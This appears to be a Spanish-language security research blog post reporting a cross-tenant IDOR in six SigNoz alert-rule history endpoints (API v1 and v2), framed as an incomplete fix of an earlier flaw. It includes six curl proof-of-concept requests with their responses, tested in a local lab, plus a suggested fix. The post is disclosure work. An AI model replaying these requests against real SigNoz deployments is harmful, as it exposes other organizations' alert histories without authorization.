@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SigNoz: IDOR en alert-rule history endpoints | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre una corrección incompleta de IDOR en los seis endpoints de historial de alert rules de SigNoz." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/signoz-alert-rule-history-idor-incomplete-fix.html" />
+  <meta property="og:title" content="SigNoz: IDOR en alert-rule history endpoints" />
+  <meta property="og:description" content="Investigación sobre una corrección incompleta de IDOR en endpoints de historial de alert rules de SigNoz." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/signoz-alert-rule-history-idor-incomplete-fix.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="SigNoz: IDOR en alert-rule history endpoints" />
+  <meta name="twitter:description" content="IDOR cross-tenant en los endpoints de historial de alert rules de SigNoz." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / signoz</p>
+      <h1>Alert-rule history IDOR<span>_</span></h1>
+      <div class="writeup-meta"><span>Medium</span><span>Cross-tenant IDOR</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">SigNoz</span><span class="tag">IDOR</span><span class="tag">Broken Access Control</span><span class="tag">Alert History</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Contexto:</strong> este reporte documenta una corrección incompleta de un IDOR anterior en alert rules. La validación se realizó en un laboratorio local de dos organizaciones construido desde la Community Edition de SigNoz, sin usuarios, tokens ni proveedor de identidad compartidos.</p></blockquote>
+
+        <p>Durante la revisión de SigNoz encontré que los seis endpoints de historial de estado de alert rules no verificaban que la organización del usuario fuera propietaria de la regla consultada.</p>
+
+        <p>Cualquier usuario autenticado con rol Viewer o superior que conociera o adivinara el UUID de una regla de otra organización podía leer su historial completo de triggers y estados, sin relación alguna entre los dos tenants.</p>
+
+        <p>Un problema de control de acceso sobre las operaciones CRUD de alert rules había sido reportado y corregido previamente mediante un filtro <code>org_id</code>. El mismo patrón seguía presente en los endpoints hermanos del historial, tanto en la API v1 como en la v2. Por eso este hallazgo debe entenderse como una señal de corrección incompleta, no como una clase nueva de vulnerabilidad.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>SigNoz Community Edition</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/SigNoz/signoz" target="_blank" rel="noopener noreferrer">github.com/SigNoz/signoz</a></td></tr>
+            <tr><td>Reporte enviado</td><td>5 de agosto de 2026</td></tr>
+            <tr><td>Componente</td><td>Alert-rule state history</td></tr>
+            <tr><td>APIs afectadas</td><td>v1 y v2</td></tr>
+            <tr><td>Endpoints afectados</td><td>6</td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Rol mínimo confirmado</td><td>Viewer</td></tr>
+            <tr><td>Vulnerabilidad</td><td>CWE-639 / CWE-284</td></tr>
+            <tr><td>Severidad estimada</td><td>Medium · CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)</td></tr>
+            <tr><td>Impacto</td><td>Lectura cross-tenant de historial de alertas</td></tr>
+            <tr><td>Advisory</td><td>No indicado</td></tr>
+            <tr><td>Estado</td><td>Incomplete fix / follow-up</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Endpoints afectados</h2>
+        <h3>API v1</h3>
+        <pre><code>POST /api/v1/rules/{id}/history/stats
+POST /api/v1/rules/{id}/history/overall_status
+POST /api/v1/rules/{id}/history/timeline
+POST /api/v1/rules/{id}/history/top_contributors</code></pre>
+        <p>Los cuatro handlers legacy estaban definidos en <code>pkg/query-service/app/http_handler.go</code>.</p>
+
+        <h3>API v2</h3>
+        <pre><code>GET /api/v2/rules/{id}/history/stats
+GET /api/v2/rules/{id}/history/overall_status</code></pre>
+        <p>Estos handlers estaban definidos en <code>pkg/modules/rulestatehistory/implrulestatehistory/handler.go</code>.</p>
+
+        <h2>Falta de ownership check en v2</h2>
+        <p><code>GetRuleHistoryStats</code> y <code>GetRuleHistoryOverallStatus</code> no extraían <code>claims.OrgID</code>, a diferencia de otros handlers v2 del mismo archivo, como <code>GetRuleHistoryTimeline</code>, <code>GetRuleHistoryContributors</code> y los de filtros.</p>
+
+        <p>La capa inferior consultaba únicamente por <code>rule_id</code>. La tabla ClickHouse <code>distributed_rule_state_history_v0</code> tampoco contiene una columna <code>org_id</code>, por lo que el aislamiento por tenant es imposible en ese nivel si no se valida la propiedad antes de ejecutar la consulta.</p>
+
+        <h2>La misma brecha en v1</h2>
+        <p>Los cuatro handlers legacy, <code>getRuleStats</code>, <code>getOverallStateTransitions</code>, <code>getRuleStateHistory</code> y <code>getRuleStateHistoryTopContributors</code>, compartían la misma omisión.</p>
+
+        <p>Todos llamaban a funciones del reader ClickHouse que filtraban por <code>rule_id</code>, pero nunca por <code>org_id</code>. El UUID de la regla se convertía así en el único límite efectivo, aunque la autorización de la petición se hubiera realizado para un usuario de otra organización.</p>
+
+        <h2>Modelo del fallo</h2>
+        <pre><code>token del usuario en Org B
+        ↓
+claims.OrgID = Org B
+        ↓
+URL contiene RULE_A_ID
+        ↓
+handler valida formato UUID
+        ↓
+reader consulta rule_id = RULE_A_ID
+        ↓
+historial de Org A devuelto a Org B</code></pre>
+
+        <p>Validar que el identificador tenga formato UUID no verifica que el recurso pertenezca al tenant del usuario. El control debe ocurrir antes de consultar el historial.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La reproducción utilizó un laboratorio local de dos organizaciones en la Community Edition:</p>
+        <ul>
+          <li>Org A: organización propietaria de la alert rule.</li>
+          <li>Org B: organización del usuario que realiza la consulta.</li>
+          <li><code>RULE_A_ID</code>: UUID de una regla creada en Org A.</li>
+          <li><code>TOKEN_B</code>: token de un usuario de Org B sin relación con Org A.</li>
+        </ul>
+
+        <p>La regla no llegó a dispararse durante la corta vida del laboratorio. Por eso algunos campos devueltos fueron cero o listas vacías; el hallazgo es el <code>HTTP 200</code> con datos asociados a una regla de otro tenant, donde correspondía un <code>403</code> o <code>404</code>.</p>
+
+        <h3>1. v1: history/stats</h3>
+        <pre><code>curl -sS -X POST \
+  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/stats" \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"start":1,"end":9999999999999}'</code></pre>
+        <pre><code>{
+  "status": "success",
+  "data": {
+    "totalCurrentTriggers": 0,
+    "totalPastTriggers": 0,
+    "currentAvgResolutionTime": "0",
+    "pastAvgResolutionTime": "0"
+  }
+}</code></pre>
+        <p>Resultado: <code>HTTP 200</code> para una regla de Org A utilizando un token de Org B.</p>
+
+        <h3>2. v1: history/overall_status</h3>
+        <pre><code>curl -sS -X POST \
+  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/overall_status" \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"start":1,"end":9999999999999}'
+
+HTTP/1.1 200
+{"status":"success","data":[{"state":"inactive","start":1,"end":9999999999999}]}</code></pre>
+
+        <h3>3. v1: history/timeline</h3>
+        <pre><code>curl -sS -X POST \
+  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/timeline" \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"start":1,"end":9999999999999,"order":"desc"}'
+
+HTTP/1.1 200
+{"status":"success","data":{"items":[],"total":0,"labels":{}}}</code></pre>
+
+        <p>Una petición inicial sin el campo <code>order</code> fue rechazada con <code>400 order must be asc or desc</code>. Esto era una validación de forma de la petición anterior al código vulnerable, no una mitigación del control de acceso.</p>
+
+        <h3>4. v1: history/top_contributors</h3>
+        <pre><code>curl -sS -X POST \
+  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/top_contributors" \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"start":1,"end":9999999999999}'
+
+HTTP/1.1 200
+{"status":"success","data":[]}</code></pre>
+
+        <h3>5. v2: history/stats</h3>
+        <pre><code>curl -sS \
+  "$BASE_URL/api/v2/rules/$RULE_A_ID/history/stats?start=1&amp;end=9999999999999" \
+  -H "Authorization: Bearer $TOKEN_B"
+
+HTTP/1.1 200
+{"status":"success","data":{"totalCurrentTriggers":0,"totalPastTriggers":0,"currentTriggersSeries":{"values":[]}}}</code></pre>
+
+        <h3>6. v2: history/overall_status</h3>
+        <pre><code>curl -sS \
+  "$BASE_URL/api/v2/rules/$RULE_A_ID/history/overall_status?start=1&amp;end=9999999999999" \
+  -H "Authorization: Bearer $TOKEN_B"
+
+HTTP/1.1 200
+{"status":"success","data":[{"state":"inactive","start":1,"end":9999999999999}]}</code></pre>
+
+        <p>Los seis endpoints devolvieron <code>HTTP 200</code> con datos asociados a una regla de Org A a un caller de Org B sin relación con ella.</p>
+
+        <h2>Impacto</h2>
+        <p>Un atacante con cualquier cuenta válida podía acceder al historial de alertas de otra organización si obtenía el UUID de la regla mediante comportamiento de la aplicación, divulgación u otra fuente.</p>
+
+        <p>El historial puede revelar qué condiciones se dispararon, cuándo ocurrieron, con qué frecuencia y cuál fue el tiempo medio de resolución. Estos datos permiten inferir información sobre la salud de la infraestructura de la organización víctima y su cadencia de incidentes.</p>
+
+        <h2>Corrección sugerida</h2>
+        <p>Los seis endpoints deben extraer <code>claims.OrgID</code> y verificar la propiedad de la regla antes de ejecutar cualquier consulta de historial. La validación puede resolverse mediante el rule store con scope de organización, siguiendo el patrón de los handlers v2 que ya realizan la comprobación:</p>
+        <pre><code>claims.OrgID
+    ↓
+resolver alert rule con org_id
+    ↓
+si no pertenece al tenant: 403/404
+    ↓
+consultar historial por rule_id</code></pre>
+
+        <p>Como la tabla ClickHouse <code>distributed_rule_state_history_v0</code> no contiene <code>org_id</code>, el control debe hacerse en la capa Go antes de ejecutar la consulta, no únicamente en SQL.</p>
+
+        <p>También conviene añadir pruebas de regresión con dos organizaciones independientes para cada endpoint v1 y v2, comprobando que un UUID válido de otro tenant no devuelve resultados.</p>
+
+        <h2>Estado</h2>
+        <p>Este reporte documenta una corrección incompleta de un IDOR anterior en alert rules. La validación quedó confirmada en los seis endpoints de historial, tanto v1 como v2, y los resultados quedan documentados en este artículo.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
